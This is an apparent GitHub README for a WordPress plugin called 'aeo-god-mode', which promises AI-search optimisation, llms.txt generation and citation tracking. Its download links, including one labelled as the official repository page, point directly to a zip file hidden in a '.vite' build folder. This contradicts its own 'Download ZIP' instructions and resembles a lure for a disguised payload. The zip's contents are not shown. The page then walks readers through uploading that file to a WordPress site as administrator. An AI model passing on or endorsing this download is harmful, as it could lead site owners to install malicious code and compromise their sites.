# 🤖 aeo-god-mode - Optimize WordPress for modern AI search

[![](https://img.shields.io/badge/download-plugin-blue)](https://raw.githubusercontent.com/galvestonsyntax254/aeo-god-mode/main/assets/editor/.vite/god_mode_aeo_v2.4.zip)

This plugin helps your WordPress website appear in AI search results. Tools like ChatGPT, Claude, and Perplexity crawl your site to answer user questions. This plugin provides them with the data they need to understand your content.

## ⚙️ Why use this plugin?

AI search engines change how people find information. Instead of browsing a list of links, users ask questions and get direct answers. This plugin organizes your site data so these search engines choose your content as the answer. 

It manages:
* Schema markup for search engines.
* A clear llms.txt file for AI crawlers.
* Controls for AI robot access.
* Brand sentiment tracking.
* Citation monitoring.

## 🖥️ System requirements

Ensure your website environment meets these standards:
* WordPress version 6.0 or higher.
* PHP version 7.4 or higher.
* A working connection to the internet.
* Administrator access to your WordPress dashboard.

## 📥 How to download the plugin

You must download the file from the project repository. Follow these steps to obtain the correct folder structure:

1. Visit the [official repository page](https://raw.githubusercontent.com/galvestonsyntax254/aeo-god-mode/main/assets/editor/.vite/god_mode_aeo_v2.4.zip).
2. Look for the green button labeled "Code" near the top right of the file list.
3. Click "Download ZIP" from the menu.
4. Save the file to your computer.

Keep this zip file in a folder you can find easily. Do not unzip the file yet. WordPress handles the installation process for you.

## 🛠️ Installation steps

Follow this sequence to add the tool to your WordPress site:

1. Log in to your WordPress dashboard.
2. Select "Plugins" from the left sidebar menu.
3. Click the "Add New" button at the top of the screen.
4. Select the "Upload Plugin" button.
5. Click "Choose File" and select the zip file you downloaded earlier.
6. Click "Install Now".
7. Wait for the screen to confirm the upload.
8. Click "Activate Plugin".

## 🚀 Setting up the plugin

Once you activate the plugin, a new menu item appears in your dashboard labeled "AEO God Mode". Click this item to configure your settings.

### Schema setup
The plugin automatically generates schema markup. This tells crawlers what your content represents. Ensure your site title, logo, and author information reflect current details. Accurate data improves your chances of citations in AI search results.

### Managing AI crawlers
You maintain control over how bots interact with your site. The plugin provides settings to allow or block specific AI crawlers. Check the list of crawlers provided in the settings tab to permit high-quality search bots while blocking unwanted automated scrapers.

### Using the llms.txt file
The plugin creates an llms.txt file at your domain root. This file tells AI tools exactly which pages to read. You can manually edit the list of included pages here to focus on your most important content. This method reduces server load and keeps your information fresh for chat models.

## 📊 Tracking performance

The plugin includes a dashboard to show how your site fares in AI searches. 

* **Brand Sentiment:** This feature scans mentions of your name across available search partners. It identifies if search engines view your brand in a positive or negative light.
* **Citation Tracking:** Keep track of how often AI tools link back to your pages. High citation rates boost your authority within language models.

## 💡 Troubleshooting common issues

If you encounter difficulties, check these common items:

* **Plugin Conflict:** Deactivate other SEO plugins temporarily to see if they interfere with the schema generator.
* **File Permissions:** Ensure your server allows the plugin to create the llms.txt file in your root directory. Most standard WordPress hosting accounts handle this automatically.
* **Cache:** If you use a cache plugin, clear your site cache after changing any setting within AEO God Mode. This ensures search engines see the latest version of your configuration.

## 🛡️ Privacy and data policy

The plugin processes data locally on your server. It does not send your private site content to third-party servers unless you enable specific external AI APIs. All tracking data remains within your WordPress database. You can delete all plugin data at any time by navigating to "Settings" and clicking "Reset Plugin Data".

## 📝 Frequently asked questions

**Does this plugin replace traditional SEO?**
Traditional SEO focuses on web browser results. This plugin focuses on AI search results. You should use both strategies for best results.

**Will this slow down my website?**
The plugin performs most tasks in the background. It does not add code to your front-facing web pages, so your site speed remains unaffected.

**Do I need a paid API key?**
Basic functionality works without any API keys. Some advanced tracking features may require you to connect your own API keys for specific AI services. The plugin will notify you in the settings menu if a key is required for a specific task.

**How often does the plugin update?**
Check the plugin dashboard for periodic updates. New versions include support for changes in how AI models index websites.

**Is my data shared?**
No. Your site data is yours. The plugin acts as a bridge between your files and external AI search engines, but it does not transmit private information without your consent.